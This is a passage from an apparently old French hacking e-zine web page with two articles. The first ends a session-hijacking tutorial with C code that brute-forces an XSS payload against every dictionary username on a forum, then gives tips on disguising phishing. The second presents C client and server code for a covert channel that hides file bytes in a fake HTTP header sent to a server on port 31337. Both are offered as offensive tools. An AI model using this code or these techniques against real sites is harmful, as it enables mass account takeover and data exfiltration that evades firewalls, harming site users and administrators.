          l'adresse email de notre victime en envoyant une requ&ecirc;te POST. 
          Par exemple toto va changer l'email de root en 'toto@toto.com' puis 
          il ira sur le forum, fera un &eacute;chec de connexion en tant que root 
          (mauvais mot de passe) puis cliquera sur &quot;Me rappeller mon mot 
          de passe&quot; et aura le mot de passe root :)</p>
        <p>Bon ! Maintenant on sait voler la session d'un utilisateur particulier 
          de fa&ccedil;on automatique et surtout au moment o&ugrave; la session 
          est toujours ouverte. Mais tant qu'&agrave; faire un script automatique 
          autant qu'il serve le plus possible... Comment faire pour attaquer tous 
          les utilisateurs du forum ou du webmail cible ?<br>
          La solution la plus simple est de trouver une faille XSS dans une page 
          statique (je veux dire qui est la m&ecirc;me pour tous les utilisateurs.) 
          Malheureusement ce n'est pas toujours le cas...<br>
          Il faut alors appliquer l'injection XSS &agrave; tous les utilisateurs. 
          On ne conna&icirc;t pas le nom de tous les utilisateurs mais il y a 
          de bonnes chances que la plupart des noms ou logins soient tir&eacute;s 
          d'un dictionnaire...</p>
        <p>La solution : un brute force de requ&ecirc;te HTTP. Imaginons un forum 
          vuln&eacute;rable au XSS au niveau du script des messages priv&eacute;s. 
          La page doit &ecirc;tre appel&eacute;e de la fa&ccedil;on suivante :<br>
          <i>/forum/pv.php?login=<font color="#3366FF">&lt;login_utilisateur&gt;</font>&amp;message=<font color="#3366FF">&lt;message&gt;</font></i><br>
          Il suffira de changer la variable login &agrave; chaque requ&ecirc;te... 
          Passons maintenant &agrave; la programmation. Nous allons utiliser une 
          astuce pour rendre l'exploitation plus rapide. Depuis la version 1.1, 
          le protocole HTTP permet les connexions persistantes. C'est &agrave; 
          dire qu'un navigateur peut demander plusieurs fichiers &agrave; un serveur 
          HTTP &agrave; la suite sans avoir &agrave; se reconnecter. Avec les 
          anciennes versions nous aurions d&ucirc; pour chaque requ&ecirc;te : 
          nous connecter au serveur - envoyer notre req&ucirc;ete - nous d&eacute;connecter...<br>
          Ici on va se connecter une seule fois et envoyer toutes nos requ&ecirc;tes 
          &agrave; la suite...</p>
        <p>-- brute_req.c --</p>
        <pre><font color="#999900">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;</font>

<font color="#999900">#define DICO_PATH &quot;dico.txt&quot;
#define HOST &quot;localhost&quot;</font>

<font color="#3366FF">int</font> main(<font color="#3366FF">int</font> argc,<font color="#3366FF">char</font> *argv[])
{
    FILE *in;
    <font color="#3366FF">char</font> requete[<font color="#3366FF">1024</font>];
    <font color="#3366FF">int</font> sock;
    <font color="#3366FF">struct</font> sockaddr_in addr;
    <font color="#3366FF">struct</font> hostent *hp;
    <font color="#3366FF">char</font> mot[<font color="#3366FF">32</font>];
    <font color="#3366FF">char</font> c;
    <font color="#3366FF">unsigned int</font> i;

    <font color="#3366FF">if</font>((hp=gethostbyname(HOST))==<font color="#3366FF">0</font>)
    {
        printf(<font color="#FF00FF">&quot;Impossible de trouver %s.\n&quot;</font>,HOST);
        <font color="#3366FF">return</font> -<font color="#3366FF">1</font>;
    }

    bcopy((<font color="#3366FF">char</font>*)hp-&gt;h_addr, (<font color="#3366FF">char</font>*)&addr.sin_addr, hp-&gt;h_length);
    addr.sin_family=hp-&gt;h_addrtype;
    addr.sin_port=htons(<font color="#3366FF">80</font>);

    <font color="#3366FF">if</font>((sock=socket(AF_INET, SOCK_STREAM, <font color="#3366FF">0</font>))==-<font color="#3366FF">1</font>)
    {
        perror(<font color="#FF00FF">&quot;Pb socket()&quot;</font>);
        <font color="#3366FF">return</font> -<font color="#3366FF">1</font>;
    }
	
    <font color="#3366FF">if</font>((connect(sock,(<font color="#3366FF">struct</font> sockaddr*)&addr,<font color="#3366FF">sizeof</font>(addr)))!=-<font color="#3366FF">1</font>)
    {
        printf(<font color="#FF00FF">&quot;La connexion a ete etablie.\n&quot;</font>);
        <font color="#3366FF">if</font>(!(in=fopen(DICO_PATH, &quot;r&quot;)))
        {
            perror(<font color="#FF00FF">&quot;Ouverture dico.\n&quot;</font>);
            close(sock);
            <font color="#3366FF">return</font> -<font color="#3366FF">1</font>;
        }
        i=<font color="#3366FF">0</font>;
        <font color="#3366FF">while</font>(!feof(in))
        {
            fread(&c,<font color="#3366FF">1</font>,<font color="#3366FF">1</font>,in);
            <font color="#3366FF">if</font>(c==<font color="#FF00FF">'\n'</font>)
            {
                mot[i]=<font color="#FF00FF">'\0'</font>;
                i=<font color="#3366FF">0</font>;
                sprintf(requete,
                        <font color="#FF00FF">&quot;GET /forum/pv.php?login=%s&quot;</font>
                        <font color="#FF00FF">&quot;&message=&lt;script&gt;alert('bl4h!')&lt;/script&gt; HTTP/1.1\n&quot;</font>
                        <font color="#FF00FF">&quot;Host: %s\n&quot;</font>
                        <font color="#FF00FF">&quot;Connection: Keep-Alive\n\n&quot;</font>,
                        mot,
                        HOST);
                send(sock, requete, strlen(requete), <font color="#3366FF">0</font>);
            }
            <font color="#3366FF">else</font>
            {
                mot[i]=c;
                i++;
            }
        }
        fclose(in);
        sprintf(requete,<font color="#FF00FF">&quot;GET / HTTP/1.1\n&quot;</font>
                <font color="#FF00FF">&quot;Host: %s\n&quot;</font>
                <font color="#FF00FF">&quot;Connection: close\n\n&quot;</font>,
                HOST);
        send(sock,requete,strlen(requete),<font color="#3366FF">0</font>);
    }
    close(sock);
    <font color="#3366FF">return</font> <font color="#3366FF">0</font>;
}</pre>
        <p class="texttitre">Les protections possibles contre le vol de session</p>
        <p>Evidemment il existe des moyens de bloquer le vol de session HTTP. 
          La plus r&eacute;pandu est de faire une v&eacute;rification sur l'IP 
          du visiteur. Lorsque vous vous loggez le script garde en m&eacute;moire 
          votre IP :<br>
          $_SESSION['IP']=$_SERVER['REMOTE_ADDR'];<br>
          Ensuite &agrave; chaque page demand&eacute;e il compare l'ip du visiteur 
          avec celle enregistr&eacute;e au login... Si c'est diff&eacute;rent 
          il vous redirige vers une page d'erreur.</p>
        <p>La nouvelle protection contre le vol de cookie vient de Microsoft et 
          s'appelle httpOnly. Le principe est d'emp&eacute;cher le navigateur 
          de la victime de donner le pr&eacute;cieux cookie &agrave; la victime. 
          Pour d&eacute;clarer un cookie comme &eacute;tant httpOnly, le serveur 
          doit envoyer au navigateur la requ&ecirc;te :<br>
          Set-Cookie: nom=valeur; httpOnly<br>
          Lorsque le navigateur re&ccedil;oit un cookie avec l'option httpOnly, 
          il d&eacute;sactive la fonction javascript document.cookie et emp&egrave;che 
          donc la r&eacute;cup&eacute;ration du cookie.<br>
          Mais ne vous inqui&eacute;tez pas : comme c'est une invention Microsoft 
          le seul navigateur qui supporte cette option pour le moment est IE 6 
          et on sait que IE n'est pas le navigateur le plus s&ucirc;r :p</p>
        <p class="texttitre">Derniers conseils pour la route</p>
        <p>Avant de vous lancer dans le phishing sauvage n'oubliez pas la r&egrave;gle 
          principale : bien &eacute;tudier sa victime. Si le site que vous attaquez 
          lance r&eacute;guli&egrave;rement des popups publicitaire, reprenez 
          exactement le code de la popup pour que votre CGI ne fasse pas &quot;t&acirc;che&quot;. 
          Ensuite n'h&eacute;sitez pas &agrave; encoder l'url de votre cgi en 
          remplacant les caract&egrave;res par leur repr&eacute;sentation hexad&eacute;cimale.</p>
        <p class="textgras" align="right">sirius_black</p>
      </div></td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="covert_channel"></a>Frenchy 
      Covert Channel</td>
  </tr>
  <tr> 
    <td valign="top" class="textpetit"> <p class="texttitre"> Explication g&eacute;n&eacute;rale 
      </p>
      Le covert channel peut &ecirc;tre traduit en fran&ccedil;ais par flux de 
      donn&eacute;es camoufl&eacute;es.<br>
      Un covert channel est une technique ayant pour but de faire passer au travers 
      d'un firewall des donn&eacute;es. Ces donn&eacute;es doivent &ecirc;tre 
      pr&eacute;sentent dans un paquet sans &ecirc;tre visible par le firewall 
      ou l'administrateur qui sniff son r&eacute;seau. Pour cela on a recours 
      &agrave; diff&eacute;rentes techniques variables en fonction des protocoles 
      choisis. Mais en g&eacute;n&eacute;ral le choix s'oriente naturellement 
      vers les headers des paquets car ceux-ci sont rarement filtr&eacute;s par 
      les firewalls.<br>
      De plus les champs optionnels et/ou de grande taille sont pr&eacute;f&eacute;r&eacute;s 
      par les hackers car il s'agit l&agrave; de pouvoir y placer un maximum d'information.<br>
      Le covert channel et le tunneling sont deux techniques distinct contrairement 
      &agrave; ce que peuvent penser certaines personnes. Le tunneling consiste 
      &agrave; encapsuler un protocole dans un autre (au niveau du corps) tandis 
      que les covert channel eux, fonctionne en... vous verrez bien apr&egrave;s 
      avoir lu cet article :). 
      <p class="texttitre">Introduction</p>
      Le but premier de cet article est de vous pr&eacute;sentez quelques m&eacute;thodes 
      de covert channel accompagn&eacute;s de code en C fonctionnant sous linux.<br>
      J'ai d'abord voulu int&eacute;grer l'&eacute;change de donn&eacute;es sous 
      la forme de routines permettant d'envoyer des commandes &agrave; une backdoor. 
      Mais au fur et &agrave; mesure du d&eacute;veloppement j'ai int&eacute;gr&eacute; 
      le code de fa&ccedil;on &agrave; ce qu'il puisse transf&eacute;rer des donn&eacute;es 
      au sein des paquets.<br>
      Les codes pr&eacute;sents dans cet article sont des proof of concepts, comprenez 
      qu'ils ne sont ni optimis&eacute;s ni m&ecirc;me s&eacute;curis&eacute;s. 
      C'est seulement des exemples (&agrave; ne pas suivre) pour expliquer d'une 
      fa&ccedil;on moins th&eacute;orique les coverts channels. 
      <p class="texttitre">Exemple : Protocole HTTP</p>
      Le protocole HTTP est un protocole de haut niveau qu'il est donc difficile 
      de filtrer surtout qu'il est tr&egrave;s utilis&eacute; et, de plus, il 
      est souvent accompagn&eacute;, au niveau des requ&ecirc;tes, d'informations 
      annexes envoy&eacute;es par des modules/plug-in. On peut dire qu'il s'agit 
      l&agrave; d'un protocole tout &agrave; fait adapt&eacute; au covert channel: 
      un header contenant des champs permettant de stocker beaucoup de donn&eacute;es, 
      la possibilit&eacute; de stocker les donn&eacute;es dans le corps de fa&ccedil;on 
      transparente. Ce protocole, du fait de ses sp&eacute;cificit&eacute;s, est 
      assez difficile &agrave; filtrer.<br>
      De plus comme il s'agit d'un protocole de haut niveau nous n'avons besoin 
      que des sock_stream pour travailler avec donc il n'y a pas besoin des droits 
      root.<br>
      Vous trouverez plus d'informations sur ces sp&eacute;cifications dans les 
      [<a href="#RFCHTTP">RFC</a>].<br> <br>
      Tout d'abord abordons les diff&eacute;rents mod&egrave;les client/serveur 
      :<br>
      - Le mod&egrave;le serveur httpd: il consiste en un programme "&eacute;mulant" 
      le fonctionnement d'un serveur httpd tout en r&eacute;cup&eacute;rant les 
      donn&eacute;es cach&eacute;es dans la requ&ecirc;te (m&eacute;thode utilis&eacute;e 
      dans le code source).<br>
      - Le mod&egrave;le serveur proxy: mod&egrave;le consistant en un programme 
      "&eacute;mulant" le fonctionnement d'un proxy, le serveur attend l'arriv&eacute;e 
      de la requ&ecirc;te, r&eacute;cup&egrave;re les donn&eacute;es cach&eacute;es 
      puis agit comme un proxy en renvoyant la requ&ecirc;te vers le serveur httpd 
      demand&eacute;.<br>
      - Le mod&egrave;le serveur CGI: cette technique n&eacute;cessite de mettre 
      en place un script CGI sur le httpd cible pour que le script agisse comme 
      un CGI mais r&eacute;cup&egrave;re les donn&eacute;es camoufl&eacute;es 
      via l'URI ou les autres variables d'environnement ou encore via le corps 
      du message.<br> <br>
      Int&eacute;ressons nous maintenant aux champs, qui pourrait nous int&eacute;resser, 
      d'une requ&ecirc;te HTTP de type GET :<br>
      - La cha&icirc;ne URI: Il est facile de cacher des donn&eacute;es sous forme 
      d'arguments via l'URI<br> <pre><code>GET http://www.somehost.com/cgi-bin/board.cgi?view=12121212 / HTTP/1.0<br></code></pre>
      Ici on voit bien que la variable view de l'URI peut contenir les donn&eacute;es 
      cach&eacute;es (ici c'est flagrant mais il est tr&egrave;s facile de cr&eacute;er 
      un hash md5 et de faire croire qu'il s'agit d'un num&eacute;ro de session 
      par exemple).<br>
      - User-Agent: Dans ce champ on peut dissimuler ses donn&eacute;es bien que 
      ce soit moins &eacute;vident que pour le champ pr&eacute;c&eacute;dent.<br> 
      <pre><code>User-Agent: Mozilla/5.0 (12121212)<br></code></pre>
      Ici on pourrait formatter la donn&eacute;e pour quelle soit cach&eacute;e 
      dans la version du syst&egrave;me ou du navigateur: (Linux 2.4.12 Konqueror/1.2) 
      Gecko/12121212&nbsp; par exemple.<br>
      - Accept-Charset:&nbsp; Ce champ normalement utiliser pour d&eacute;finir 
      les charset utilis&eacute;s par le navigateur peut camoufler certaines valeurs.<br> 
      <pre><code>&gt;Accept-Charset: ISO-8859-1,utf-8,ISO-1212-1<br></code></pre>
      - Les champs &eacute;tendus du header (qui eux peuvent &ecirc;tre filtr&eacute;s 
      par les firewall) peuvent permettre d'inclure des donn&eacute;es dans l'ent&ecirc;te 
      de taille variable.<br> <pre><code>X-Microsoft-Plugin: unexpected error #12121212</code></pre>
      C'est la m&eacute;thode utilis&eacute;e par le code source mais n'est pas 
      la plus furtive.<br> <br>
      Pour (beaucoup ?) plus de d&eacute;tails sur les covert channel HTTP, lisez 
      l'excellent texte de Simon Castro [<a href="#CASTRO">CASTRO</a>].<br> <br>
      Attaquons la pratique :<br>
      Du c&ocirc;t&eacute; du client :<br> <pre><code>client.h :<br>     1	#include &lt;stdio.h&gt;<br>     2	#include &lt;stdlib.h&gt;<br>     3	#include &lt;errno.h&gt;<br>     4	#include &lt;string.h&gt;<br>     5	#include &lt;netdb.h&gt;<br>     6	#include &lt;sys/types.h&gt;<br>     7	#include &lt;netinet/in.h&gt;<br>     8	#include &lt;sys/socket.h&gt;<br>       <br>     9	#define PORT 31337 /* the port client will be connecting to */<br>    10	#define MAXDATASIZE 1024 /* max number of bytes we can get at once */<br>       <br>    11	char *CreateQuery(char *, char *, int);<br><br>client.c:<br>     1	#include "client.h"<br>     2	int main(int argc, char *argv[])<br>     3	{<br>     4	    int sockfd, numbytes, ch;<br>     5	    char *requete = (char *)malloc(1024*sizeof(char));<br>     6	    char target[20], uri[80], buf[MAXDATASIZE+1];<br>     7	    struct hostent *he;<br>     8	    struct sockaddr_in their_addr; <br>     9	    FILE *input;<br>    10	    <br>    11	    <br>    12	    if (argc != 4) {<br>    13	        fprintf(stderr,"Usage: %s Target Page File\n", argv[0]);<br>    14	        fprintf(stderr,"Example: %s 195.25.63.78 /index.htm exploit.c\n", argv[0]);<br>    15	        fprintf(stderr,"Page max size is 80 characters\n");<br>    16	        fprintf(stderr,"File must contain ascii characters\n\n");<br>    17	        exit(1);<br>    18	    }<br>    19	    <br>    20	    strncpy(target, argv[1], 17);<br>    21	    strncpy(uri, argv[2], 79);<br>    22	    <br>    23	    if ((he=gethostbyname(target)) == NULL) {  <br>    24	     	herror("gethostbyname");<br>    25	     	exit(1);<br>    26	    }<br>    27	    <br>    28	    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {<br>    29	    	perror("socket");<br>    30	    	exit(1);<br>    31	    }<br>    32	    their_addr.sin_family = AF_INET;      <br>    33	    their_addr.sin_port = htons(PORT);    <br>    34	    their_addr.sin_addr = *((struct in_addr *)he-&gt;h_addr);<br>    35	    bzero(&amp;(their_addr.sin_zero), 8);     <br>    36	    <br>    37	    if (connect(sockfd, (struct sockaddr *)&amp;their_addr, sizeof(struct sockaddr)) == -1) { <br>    38	    	perror("connect");<br>    39	    	exit(1);<br>    40	    }<br>    41	          <br>    42	    if((input = fopen(argv[3], "rb")) == NULL) {<br>    43	    	printf("I cannot open file %s for reading", argv[3]);<br>    44	    	exit(1);<br>    45	    }	<br>    46	    <br>    47	    else while((ch = fgetc(input)) != EOF) {<br>    48	    <br>    49	    	sleep(1);<br>    50	      <br>    51	    	requete = CreateQuery(uri, target, ch);<br>    52	    	if (send(sockfd, requete, strlen(requete)+1, 0) == -1) {<br>    53	    		  perror("send");<br>    54	    		  break;<br>    55	    		  }<br>    56	    	  <br>    57	   	printf("Sending Data: %c\n",ch);<br>    58	   	<br>    59	   	while ((numbytes = read(sockfd, buf, MAXDATASIZE)) != 0) {<br>    60	   		buf[numbytes] = '\0';<br>    61		    	printf("Data successfully received.\n");<br>    62		    	break;<br>    63		    	}<br>    64	    }<br>    65	    fclose(input);<br>    66	    free(requete);<br>    67	    close(sockfd);<br>    68	    return 0;<br>    69	}<br>    70	char *CreateQuery(char *page, char *host, int ch) {<br>    71		 char *header = (char *)malloc(1024*sizeof(char));<br>    72		 <br>    73	    sprintf(header,<br>    74	    "GET %s HTTP/1.1\r\n"<br>    75	    "Host %s\r\n"<br>    76	    "User-Agent: Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.6) Gecko/20040115\r\n"<br>    77	    "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1\r\n"<br>    78	    "Accept-Language: fr,en;q=0.5\r\n"<br>    79		 "Accept-Encoding: gzip,deflate\r\n"<br>    80		 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"<br>    81		 "Keep-Alive: 300\r\n"<br>    82		 "Connection: keep-alive\r\n"<br>    83	    "X-Microsoft-Plugin: unexpected error %d\r\n"<br>    84	    "\r\n",page,host,ch    <br>    85	    );<br>    86	    return (header);<br>    87	}<br><br></code></pre>
      Dans client.h on retrouve tous les headers n&eacute;cessaires &agrave; la 
      communication r&eacute;seau et aux fonctions utilis&eacute;es dans le code.<br>
      Passons &agrave; client.c :<br>
      lignes 4 &agrave; 9 on s'occupe de d&eacute;clarer/initialiser les donn&eacute;es.<br>
      lignes 12 &agrave; 21 petite v&eacute;rification de base des arguments pass&eacute;s 
      au programme.<br>
      lignes 23 &agrave; 26 on r&eacute;cup&egrave;re l'ip en fonction du DNS 
      passer.<br>
      lignes 28 &agrave; 31 on s'occupe de cr&eacute;er le socket (un fichier 
      o&ugrave; passeront toutes les donn&eacute;es &eacute;chang&eacute;es).<br>
      lignes 32 &agrave; 35 on remplit la structure sockaddr_in.<br>
      lignes 37 &agrave; 40 on se connecte au serveur.<br>
      lignes 42 &agrave; 45 on s'occupe d'ouvrir le fichier &agrave; transf&eacute;rer 
      (le fichier doit &ecirc;tre un fichier texte) en mode binaire et non pas 
      texte (pour pouvoir convertir les caract&egrave;res en leurs code ASCII).<br>
      ligne 47 on cr&eacute;&eacute; une boucle pour envoyer un paquet pour chaque 
      caract&egrave;re (ceci peut &ecirc;tre optimiser pour envoyer plus de donn&eacute;es 
      d'un coup).<br>
      ligne 49 on met un sleep(1) pour &eacute;viter les pertes de donn&eacute;es 
      (sur internet sans le sleep les donn&eacute;es s'encha&icirc;nent et il 
      peut y avoir des pertes de donn&eacute;es).<br>
      ligne 50 on saute &agrave; CreateQuery()<br>
      lignes 70 &agrave; 87 CreateQuery s'occupe de cr&eacute;&eacute; une requ&ecirc;te 
      contenant une erreur : 75 "Host %s\r\n" devrait &ecirc;tre "Host<span style="font-weight: bold;"><span
 style="text-decoration: underline;">:</span></span> %s\r\n".<br>
      lignes 52 &agrave; 55 on balance la requ&ecirc;te.<br>
      lignes 59 &agrave; 63 on attend la r&eacute;ponse du serveur pour &ecirc;tre 
      s&ucirc;r que les donn&eacute;es ont bien &eacute;t&eacute; re&ccedil;us.<br>
      lignes 65 &agrave; 68 on ferme tout :).<br> <br>
      Du c&ocirc;ter du serveur :<br> <pre><code>server.h:<br>     1	#include &lt;stdio.h&gt;<br>     2	#include &lt;stdlib.h&gt;<br>     3	#include &lt;errno.h&gt;<br>     4	#include &lt;string.h&gt;<br>     5	#include &lt;sys/types.h&gt;<br>     6	#include &lt;netinet/in.h&gt;<br>     7	#include &lt;sys/socket.h&gt;<br>     8	#include &lt;sys/wait.h&gt;<br>       <br>     9	#define MYPORT 31337    /* the port users will be connecting to */<br>    10	#define BACKLOG 10     /* how many pending connections queue will hold */<br>    11	#define MAXDATASIZE 2048<br>       <br>    12	int ParseResp(char *);<br>    13	char *CreateQuery(char *);<br><br>server.c:<br>     1	#include "server.h"<br>       <br>     2	int main(int argc, char *argv[])<br>     3	{<br>     4		int sockfd, new_fd, numbytes = 0;  <br>     5		struct sockaddr_in my_addr;<br>     6		struct sockaddr_in their_addr;<br>     7		int sin_size, rec, ch;<br>     8		char *buf = (char *)malloc(2048*sizeof(char));<br>     9		char *respons = (char *)malloc(1024*sizeof(char));<br>    10		char localdns[81];<br>    11		FILE *output;<br>    12		<br>    13		if (argc != 3) {<br>    14	        fprintf(stderr,"Usage: %s LocalDNS File\n", argv[0]);<br>    15	        fprintf(stderr,"Example: %s www.evil.us /tmp/xploit.c\n", argv[0]);<br>    16	        fprintf(stderr,"LocalDNS must not exceed 80 characters\n\n");<br>    17	        exit(1);<br>    18	    }<br>    19	    <br>    20	   strncpy(localdns, argv[1], 80);<br>    21	   <br>    22		if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {<br>    23		    perror("socket");<br>    24		    exit(1);<br>    25		}<br>    26		my_addr.sin_family = AF_INET;         /* host byte order */<br>    27		my_addr.sin_port = htons(MYPORT);     /* short, network byte order */<br>    28		my_addr.sin_addr.s_addr = INADDR_ANY; /* auto-fill with my IP */<br>    29		bzero(&amp;(my_addr.sin_zero), 8);        /* zero the rest of the struct */<br>    30		<br>    31		if (bind(sockfd, (struct sockaddr *)&amp;my_addr, sizeof(struct sockaddr)) == -1){<br>    32		    perror("bind");<br>    33		    exit(1);<br>    34		}<br>    35		<br>    36		if (listen(sockfd, BACKLOG) == -1) {<br>    37		    perror("listen");<br>    38		    exit(1);<br>    39		}<br>    40		if((output=fopen(argv[2],"wb"))== NULL) {<br>    41		  printf("I cannot open the file %s for writing\n",argv[2]);<br>    42		  exit(1);<br>    43		}<br>    44		while(1) {  /* main accept() loop */<br>    45		    sin_size = sizeof(struct sockaddr_in);<br>    46		    if ((new_fd = accept(sockfd, (struct sockaddr *)&amp;their_addr, &amp;sin_size))==-1){ <br>    47		        perror("accept");<br>    48		        exit(1);<br>    49		    }<br>    50		    printf("server: got connection from %s\n", inet_ntoa(their_addr.sin_addr)); <br>    51		    while ((read(new_fd, buf, MAXDATASIZE)) != 0) {<br>    52		    	sprintf(buf, "%s"+'\0', buf);<br>    53		    	ch = ParseResp(buf);<br>    54		    	fprintf(output,"%c",ch);<br>    55		      fflush(output);<br>    56		    	memset(buf, 0, strlen(buf));<br>    57		    	respons = CreateQuery(localdns);<br>    58		      if (send(new_fd, respons, strlen(respons), 0) == -1)<br>    59		            perror("send");<br>    60		    	}<br>    61		    	 <br>    62		    close(new_fd);<br>    63		    free(respons);<br>   &nbsp;64		    free(buf);<br>   &nbsp;65		    }<br>    66		  fclose(output);<br>   &nbsp;67		  return 0;	    <br>    68		}<br>    69	char *CreateQuery(char *host) {<br>    70		 char *header = (char *)malloc(1024*sizeof(char)), *data = (char *)malloc(1024*sizeof(char));<br>    71		 char *tmp = (char *)malloc(1024*sizeof(char));<br>    72		 <br>    73		 sprintf(data,<br>    74		 "17c\r\n"<br>    75		 "&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\r\n"<br>    76		 "&lt;HTML&gt;&lt;HEAD&gt;\r\n"<br>    77		 "&lt;TITLE&gt;400 Bad Request&lt;/TITLE&gt;\r\n"<br>    78		 "&lt;/HEAD&gt;&lt;BODY&gt;\r\n"<br>    79		 "&lt;H1&gt;Bad Request&lt;/H1&gt;\r\n"<br>    80		 "Your browser sent a request that this server could not understand.&lt;P&gt;\r\n"<br>    81		 "Request header field is missing colon separator.&lt;P&gt;\r\n"<br>    82		 "&lt;PRE&gt;\r\n"<br>    83		 "Host %s&lt;/PRE&gt;\r\n"<br>    84		 "&lt;P&gt;\r\n"<br>    85		 "&lt;HR&gt;\r\n"<br>    86		 "&lt;ADDRESS&gt;Apache/1.3.27 Server at %s Port 80&lt;/ADDRESS&gt;\r\n"<br>    87		 "&lt;/BODY&gt;&lt;/HTML&gt;\r\n"<br>    88		 "\r\n"<br>    89		 "0\r\n", host, host);<br>    90		 <br>    91	    sprintf(header,<br>    92	    "HTTP/1.1 400 Bad Request\r\n"<br>    93		 "Date: Mon, 26 Jul 2004 11:07:48 GMT\r\n"<br>    94		 "Server: Apache/1.3.27 (Unix) mod_tsunami/1.1 AuthMySQL/2.20\r\n"<br>    95		 "Connection: close\r\n"<br>    96		 "Transfer-Encoding: chunked\r\n"<br>    97		 "Content-Type: text/html; charset=iso-8859-1\r\n"<br>    98	    "\r\n");<br>    99	    sprintf(tmp,"%s%s",header,data);<br>   100	    free(header);<br>   101	    free(data);<br>   102	    return (tmp);<br>   103	}<br>   104	int ParseResp(char *query) {<br>   105		 char *result = (char *)malloc(24 * sizeof(char));<br>   106		 unsigned short ch;<br>   107		 <br>   108		 memcpy(result, query+strlen(query)-7, 8);<br>   109		 ch = atoi(result);<br>   110		 printf("Received: %c\n", ch);<br>   111		 free(result);<br>   112		 return ch;<br>   113	}<br>       <br></code></pre>
      En ce qui concerne server.h, c'est pareil que pour client.h.<br>
      Dans server.c :<br>
      lignes 4 &agrave; 11 on d&eacute;clare/initialise les variables.<br>
      lignes 13 &agrave; 20 petite v&eacute;rification de base des arguments pass&eacute;s 
      au serveur.<br>
      lignes 22 &agrave; 25 on cr&eacute;&eacute; le socket.<br>
      lignes 26 &agrave; 29 on remplit sockaddr_in.<br>
      lignes 31 &agrave; 39 on initialise le serveur avec bind et listen.<br>
      lignes 40 &agrave; 43 on ouvre le fichier o&ugrave; l'on va &eacute;crire.<br>
      lignes 45 &agrave; 50 on attend la connection d'un client.<br>
      ligne 51 tant que l'on re&ccedil;ois des donn&eacute;es on lit le socket.<br>
      ligne 53 on saute vers ParseResp().<br>
      lignes 104 &agrave; 113 ParseResp s'occupe de chercher les donn&eacute;es 
      cach&eacute;es (&agrave; la fin du paquet): ligne 108 on se place 7 octets 
      avant la fin du paquet et on r&eacute;cup&egrave;re les 8 octets qui suivent. 
      ligne 109 on convertis la string en integer (atoi).<br>
      lignes 54 et 55 on &eacute;crit le r&eacute;sultat du parse dans le fichier.<br>
      ligne 57 on cr&eacute;&eacute; une requ&ecirc;te de r&eacute;ponse de type 
      "400 Bad Request" au format http 1.1<br>
      lignes 58 &agrave; 60 on balance la requ&ecirc;te au client.<br>
      lignes 63 &agrave; 67 on nettoie tout &ccedil;a et on quit.<br> <br>
      Comme je le disais ce code est assez sale (quoique j'ai d&eacute;j&agrave; 
      vu pire) et on pourrait y ajouter un grand nombre d'optimisations.<br>
      Par exemple, l'utilisation de threads au niveau du serveur pour qu'il puisse 
      recevoir plusieurs paquets &agrave; la fois (la communication irait beaucoup 
      plus vite). Une technique cryptographique ou de formattage des donn&eacute;es 
      envoy&eacute;es.<br>
      Et d'autres encore.<br> <br> <a name="RFCHTTP"></a>[RFC] :<br> <a href="http://abcdrfc.free.fr/rfc-vf/rfc1945.html">http://abcdrfc.free.fr/rfc-vf/rfc1945.html</a> 
      RFC HTTP 1.0 vf<br> <a href="http://www.salemioche.com/http/http_rfc.php">http://www.salemioche.com/http/http_rfc.php</a> 
      RFC HTTP 1.1 vo<br> <br> <a name="CASTRO"></a>[CASTRO] :<br> <a
 href="http://la-cave.homelinux.com/Networking%20-%20Secu%20-%20admin/Covert_paper_fr.txt">http://la-cave.homelinux.com/Networking%20-%20Secu%20-%20admin/Covert_paper_fr.txt</a> 
      <br> <br> <p class="texttitre">Exemple: Protocole TCP</p>
      Les covert channel dans le header TCP sont bien connus ; le header TCP contient 
      plusieurs champs d'assez grande taille ou optionnels. Il s'agit d'un protocole 
      assez complexe (au niveau de l'header) ce qui ne fait que nous arranger 
      :).<br>
      Pour manipuler des paquets TCP il faut utiliser les sock_raw et donc les 
      droits root.<br>
      Pour plus d'informations je vous invite &agrave; consulter la [<a
 href="#RFCTCP">RFC</a>] TCP qui vous &eacute;clairera surement.<br> <br>
      Le header TCP est constituer de :<br> <img style="width: 610px; height: 284px;"
 alt="http://www.frameip.com/entetetcp/" src="covert_channel/img/tcp.gif"><br>
      Les champs qui peuvent nous int&eacute;resser sont :<br>
      - S&eacute;quence: contenant le num&eacute;ro de s&eacute;quence capable 
      d'identifier le paquet dans le flux<br>
      - Le num&eacute;ro d'ACK: contenant le num&eacute;ro de s&eacute;quence 
      + 1 dans le cas o&ugrave; l'on utilise un serveur de rebond. Plus d'explications 
      l&agrave;-dessus plus loin.<br>
      - Les flags: ce champ sert &agrave; sp&eacute;cifier le type de paquet TCP 
      (SYN pour initialiser une connection, ACK pour confirmer la demande de connection...). 
      On peut facilement utiliser les flags pour repr&eacute;senter une variable 
      stock&eacute;e en dur du c&ocirc;ter serveur: on active les flags URG, PSH 
      et FIN ce ki donne 101001 qui sera interpr&eacute;ter c&ocirc;ter serveur 
      comme une commande.<br>
      En fin de paquet il existe des champs optionnels que l'on peut rajout&eacute;s 
      :<br> <img style="width: 611px; height: 284px;"
 alt="http://www.frameip.com/entetetcp/" src="covert_channel/img/tcpopt.gif"><br>
      - Les options: Ce champ peut occuper une taille variable mais doit, &agrave; 
      l'aide du bourrage, toujours &ecirc;tre un multiple de 8.<br>
      Il existe &eacute;galement un pseudo header qui permet &agrave; TCP d'&eacute;viter 
      les erreurs de routage :<br> <img style="width: 611px; height: 284px;"
 alt="http://www.frameip.com/entetetcp/" src="covert_channel/img/tcpfake.gif"><br>
      Si vous n'avez pas le courage de lire en entier la RFC TCP (ce qui est compr&eacute;hensible) 
      allez faire un tour sur <br>
      [<a href="#FrameIp">FrameIp</a>].<br> <br>
